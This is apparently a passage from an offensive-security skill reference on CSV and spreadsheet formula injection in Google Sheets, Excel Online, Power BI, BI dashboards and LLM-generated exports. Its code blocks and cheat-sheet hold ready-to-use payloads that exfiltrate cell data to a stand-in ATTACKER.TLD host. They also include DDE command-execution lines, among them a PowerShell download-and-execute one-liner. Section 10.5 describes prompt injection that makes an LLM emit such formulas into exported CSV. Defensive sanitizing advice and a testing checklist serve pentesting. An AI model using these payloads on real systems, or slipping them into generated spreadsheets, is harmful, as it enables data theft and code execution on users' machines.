# csv-formula-injection 全文 第 1/3 部分

> 摘自 `references/full.md`；主卡见 `SKILL.md`。

## 10. 2026 EMERGING TECHNIQUES

### 10.1 Cloud Spreadsheet Attacks (Google Sheets, Excel Online, Airtable)

The 2026 shift from desktop Excel to cloud-hosted spreadsheets changes the exfil surface: DDE is blocked server-side in Excel Online/M365, but **IMPORT\* functions in Google Sheets** and **WEBSERVICE in Excel** remain live and auto-execute on recalculation — no user click needed in many configurations.

```bash
# Google Sheets — auto-executing exfil on sheet open (no click required)
=IMPORTXML("http://ATTACKER.TLD/csv", "//a/@href")
=IMPORTDATA("http://ATTACKER.TLD/?c="&A2)
=IMPORTHTML("http://ATTACKER.TLD/","table",1)
=IMPORTFEED("http://ATTACKER.TLD/feed")
=IMPORTRANGE("https://docs.google.com/...","Sheet1!A1:Z100")

# Silent image-based exfil (loads on sheet open, no alert)
=IMAGE("http://ATTACKER.TLD/pixel?d="&A1)

# Excel WEBSERVICE — exfil on recalculation
=WEBSERVICE("http://ATTACKER.TLD/?d="&A1)

# Click-driven exfil (social engineering wrapper)
=HYPERLINK("http://ATTACKER.TLD/?s="&A1,"Click to view invoice")
```

**Cloud platform differences (2026):**

| Platform | DDE | IMPORT\*/WEBSERVICE | Key Vector |
|---|---|---|---|
| Excel Online / M365 | Blocked server-side | `WEBSERVICE`, Power Query `Web.Contents` | Dataset refresh exfil under owner identity |
| Google Sheets | N/A | `IMPORTXML`, `IMPORTDATA`, `IMAGE` | Auto-exec on recalc; "Allow external resource" prompt |
| Airtable | N/A | No remote fetch by default | Second-order: Automations triggered by formula-evaluated conditions → webhook exfil |
| LibreOffice Calc | Local DDE | `WEBSERVICE` (if enabled) | Desktop-level; same DDE class as Excel |

### 10.2 Power Query & Power BI Injection

Power Query (`M` language) and Power BI datasets execute on **refresh** — the exfil happens server-side under the dataset owner's identity, with no victim click.

```powerquery
// Malicious Power Query — exfil on dataset refresh
let
    Source = Web.Contents("http://ATTACKER.TLD/?t=" & Text.From([SecretColumn]))
in
    Source

// SSRF via attacker-controlled connection string
Sql.Database("ATTACKER.TLD", "probe", [ConnectTimeout=10])
```

**Attack chain:** inject formula-trigger characters into a DB column → Power BI dashboard renders it → dataset refresh runs `Web.Contents` → exfil under owner identity. Defense: tenant-level "Block web-based connectors" / data-egress allow-lists.

### 10.3 Excel Lambda & Office Scripts Injection (2026)

- **Lambda functions (Excel):** user-defined `=LAMBDA(x, ...)` formulas. A malicious Lambda name imported via `Names` wraps `WEBSERVICE`/DDE — stealthier persistence that bypasses simple `=`-prefix cell scanning.
- **Office Scripts (TypeScript, Excel Online):** shared `.osts` scripts run with the user's identity and can call `fetch()` to arbitrary URLs. 2026 vector: malicious Office Script attached to a shared workbook triggers on `onSelected` event → exfil on open.

Detection: unzip `.xlsx` → inspect `xl/` parts for embedded scripts and named Lambda definitions; block external script sharing at tenant level.

### 10.4 Formula Injection in BI Dashboards (Tableau, Power BI, Metabase)

Enterprise BI tools are the **highest-impact 2026 targets** — the victim is almost always an analyst whose desktop is worth compromising:

| BI Tool | Attack Vector | Impact |
|---|---|---|
| **Metabase** | Stored CSV/export with formula triggers → analyst opens in Excel | Exfil + potential Metabase RCE (CVE-2023-38646 setup-token compounding) |
| **Tableau** | Calculated fields with `URLACTION` / `SCRIPT_*` (R/Python analytics extensions) | External requests / analytics-extension RCE if endpoint attacker-influenced |
| **Power BI** | Power Query `Web.Contents` on dataset refresh | Server-side exfil under owner identity, no click |

**Attack chain:** inject `=IMPORTXML(...)` into DB column → BI dashboard renders → analyst exports to CSV → formula executes on analyst workstation → credential theft / lateral movement.

### 10.5 AI-Generated CSV Injection (LLM-Created Payloads)

2026 trend: LLMs generating CSV content (data-pipeline outputs, AI export features, agentic data prep) can emit formula-injection payloads if unconstrained:

1. **Accidental:** LLM formatting a report cell legitimately starting with `=` (writing a formula it was asked to write) lands as a live formula in downstream spreadsheet.
2. **Adversarial / prompt-injection-driven:** attacker poisons LLM source data or system prompt so model emits `=WEBSERVICE("http://c2/?d="&...)` into exported CSV, weaponizing the AI export pipeline as delivery mechanism.

**Defense for AI pipelines:** post-generation sanitizer prefixing any cell starting with `= + - @` with `'` or wrapping in `"=""..."`; never let LLM output cells begin with formula triggers.

### 10.6 CSV Injection in AI/ML Data Pipelines

ML feature stores and training pipelines that ingest CSV (Kaggle datasets, HuggingFace datasets, DVC) can be poisoned at the data layer:

- A malicious CSV column named to match a feature carries a formula that fires exfil when an analyst opens the dataset preview in Excel/Sheets.
- More critically, **data-poisoning** of the CSV (not formula injection but tampered values) degrades model integrity — the AI supply-chain overlap.

Sanitize all CSV at ingest: strip/escape formula triggers before the data reaches a notebook or BI tool.

### 10.7 2026 Exploitation Cheat-Sheet

| Goal | Payload | Target |
|---|---|---|
| Confirm eval | `=1+1` | Excel / Sheets / LibreOffice |
| Blind ping | `=IMPORTXML("http://C/TAG","//a")` | Google Sheets |
| Silent exfil (Sheets) | `=IMPORTDATA("http://C/?d="&A1)` | Google Sheets |
| Silent exfil (Excel) | `=WEBSERVICE("http://C/?d="&A1)` | Excel (incl. Online refresh) |
| Image-based exfil | `=IMAGE("http://C/p.png?d="&A1)` | Google Sheets (loads on open) |
| Click exfil | `=HYPERLINK("http://C/?d="&A1","View")` | All |
| Command exec (legacy) | `=cmd|'/c calc'!A0` | DDE-enabled Excel |
| PS download exec | `=cmd|'/C powershell IEX(wget C/s)'!A0` | DDE-enabled Excel |
| Avoid cmd.exe | `=rundll32|'URL.dll,OpenURL C'!A` | DDE-enabled Excel |
| Power Query exfil | `Web.Contents("http://C/?d="&[Secret])` | Power BI (server-side) |

### 10.8 2026 Testing Checklist Supplement

```
□ Test cloud spreadsheet imports (Google Sheets IMPORT*, Excel WEBSERVICE) — not just desktop DDE
□ Check Power BI / Power Query datasets for Web.Contents with user-controlled URLs
□ Inspect .xlsx files for embedded Office Scripts (.osts) and named Lambda definitions
□ Test BI dashboard exports (Metabase, Tableau, Power BI) for formula trigger chars in CSV output
□ If the app uses AI/LLM to generate CSV exports, test for prompt-injection-driven formula payloads
□ Test ML data pipeline CSV ingest points for formula trigger sanitization
□ Verify cloud spreadsheet "Allow external resource" prompts cannot be bypassed
□ Check Airtable Automations for formula-triggered webhook exfiltration
□ Test scheduled report exports — a single stored payload fires on every scheduled run
□ Verify defense: leading = + - @ chars are prefixed with ' at generation time, not at display time
```

---

